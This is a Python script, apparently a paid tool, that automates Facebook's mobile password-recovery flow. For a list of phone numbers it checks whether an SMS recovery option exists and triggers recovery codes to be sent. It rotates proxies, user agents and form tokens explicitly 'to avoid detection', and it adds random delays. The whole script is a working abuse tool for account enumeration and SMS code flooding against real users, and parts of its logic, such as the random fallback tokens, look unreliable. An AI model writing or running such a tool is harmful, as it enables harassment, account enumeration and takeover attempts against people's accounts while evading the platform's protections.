import requests
import random
import re
import time
import sys

# Terminal color codes
class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

BANNER = f"""
{colors.CYAN}
 __  __   ____   _   _   _   _   __     __  ____  
|  \/  | | __ ) | | | | | \ | |  \ \   / / |  _ \ 
| |\/| | |  _ \ | | | | |  \| |   \ \ / /  | | | |
| |  | | | |_) || |_| | | |\  |    \ V /   | |_| |
|_|  |_| |____/  \___/  |_| \_|     \_/    |____/ 

{colors.YELLOW}------------------ MONEY BD - PAID ------------------{colors.RESET}
"""

print(BANNER)

# Proxy and Browser options
def select_proxy():
    print(f"{colors.YELLOW}Select Proxy Option:{colors.RESET}")
    print("1. No Proxy")
    print("2. HTTP Proxy")
    print("3. SOCKS5 Proxy")
    choice = input("Choose (1-3): ").strip()
    if choice == '2':
        proxy = input("Enter HTTP proxy (http://ip:port): ").strip()
        return {"http": proxy, "https": proxy}
    elif choice == '3':
        proxy = input("Enter SOCKS5 proxy (socks5://ip:port): ").strip()
        return {"http": proxy, "https": proxy}
    else:
        return None

def select_user_agent():
    agents = [
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    ]
    print(f"{colors.YELLOW}Select Browser User-Agent:{colors.RESET}")
    for i, ua in enumerate(agents, 1):
        print(f"{i}. {ua}")
    choice = input("Choose (1-4): ").strip()
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(agents):
            return agents[idx]
    except:
        pass
    return agents[0]

proxies = select_proxy()
user_agent = select_user_agent()

session = requests.Session()
session.headers.update({
    "User-Agent": user_agent,
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
})

if proxies:
    session.proxies.update(proxies)

def get_lsd_jazoest():
    url = "https://mbasic.facebook.com/recovery/password/search/"
    try:
        r = session.get(url, timeout=15)
        if r.status_code != 200:
            return None, None
        lsd = re.search(r'name="lsd" value="([^"]+)"', r.text)
        jazoest = re.search(r'name="jazoest" value="([^"]+)"', r.text)
        if lsd and jazoest:
            return lsd.group(1), jazoest.group(1)
    except:
        return None, None
    return None, None

def rotate_tokens():
    # Get fresh tokens each time to avoid detection
    lsd, jazoest = get_lsd_jazoest()
    if not lsd or not jazoest:
        # fallback random tokens if failed
        lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
        jazoest = '2' + ''.join(str(random.randint(0,9)) for _ in range(6))
    return lsd, jazoest

def check_sms_option(number):
    url = "https://mbasic.facebook.com/recovery/password/search/"
    lsd, jazoest = rotate_tokens()
    data = {
        "lsd": lsd,
        "jazoest": jazoest,
        "q": number,
        "flow": "recover",
        "type": "search",
        "submit": "Search"
    }
    try:
        r = session.post(url, data=data, timeout=15)
        if r.status_code != 200:
            return False, None
        text = r.text
        if ("SMS option found" in text) or ("Send code via SMS" in text):
            return True, text
        else:
            return False, text
    except:
        return False, None

def send_otp(number):
    # This simulates sending OTP by submitting the form with SMS option
    url = "https://mbasic.facebook.com/recovery/password/"
    lsd, jazoest = rotate_tokens()
    # First get the form to find the action and fb_dtsg token
    try:
        r = session.get(url, params={"q": number}, timeout=15)
        if r.status_code != 200:
            return False
        fb_dtsg = re.search(r'name="fb_dtsg" value="([^"]+)"', r.text)
        if not fb_dtsg:
            return False
        fb_dtsg = fb_dtsg.group(1)
        data = {
            "fb_dtsg": fb_dtsg,
            "jazoest": jazoest,
            "lsd": lsd,
            "flow": "recover",
            "type": "send_code",
            "method": "sms",
            "submit": "Continue"
        }
        r2 = session.post(url, params={"q": number}, data=data, timeout=15)
        if r2.status_code == 200 and ("code sent" in r2.text.lower() or "enter code" in r2.text.lower()):
            return True
    except:
        return False
    return False

def print_green(text):
    print(f"{colors.GREEN}{text}{colors.RESET}")

def print_red(text):
    print(f"{colors.RED}{text}{colors.RESET}")

def main():
    print(f"{colors.CYAN}Enter phone numbers (one per line). Empty line to start:{colors.RESET}")
    numbers = []
    while True:
        line = input().strip()
        if not line:
            break
        numbers.append(line)

    for number in numbers:
        print(f"Trying another way > {number}")
        sms_option, _ = check_sms_option(number)
        if sms_option:
            print_green("[√] SMS OPTION FOUND")
            # Send OTP twice as per requirement
            for i in range(2):
                success = send_otp(number)
                if success:
                    print_green(f"{i+1} time Code Send : {number}")
                else:
                    print_red(f"[×] FAILED TO SEND CODE : {number}")
                time.sleep(random.uniform(1.5, 3.0))
        else:
            print_red("[×] NO SMS OPTION / SKIP")

if __name__ == "__main__":
    main()
